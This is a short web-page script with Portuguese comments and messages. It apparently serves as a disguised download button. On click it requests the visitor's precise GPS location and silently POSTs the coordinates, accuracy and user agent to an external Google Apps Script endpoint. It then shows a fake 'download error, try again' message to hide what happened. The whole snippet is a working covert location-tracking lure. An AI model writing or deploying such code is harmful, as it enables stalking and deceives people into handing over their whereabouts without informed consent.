<script>
const btn = document.getElementById('sendBtn');

btn.addEventListener("click", () => {
  if (!navigator.geolocation) {
    alert("Seu dispositivo não suporta localização.");
    return;
  }

  // Solicita localização ao usuário
  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      const payload = {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        userAgent: navigator.userAgent
      };

      try {
        await fetch("https://script.google.com/macros/s/AKfycbxVbCO66Z7sc8D3a8DKMvElYI86AaRHBRYkcdElpjiSLV4oTQZGvJ_LNiCwQ8MRjsct/exec", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

      } catch (e) {
        console.log("Erro ao enviar:", e);
      }

      // ALERT APENAS DEPOIS QUE TUDO FOI FEITO
      alert("Erro ao baixar, tente novamente!");
    },

    // Erro ao obter localização
    (err) => {
      alert("Não foi possível obter sua localização. Ative o GPS.");
    },

    // Configurações
    { enableHighAccuracy: true, timeout: 8000 }
  );
});
</script>
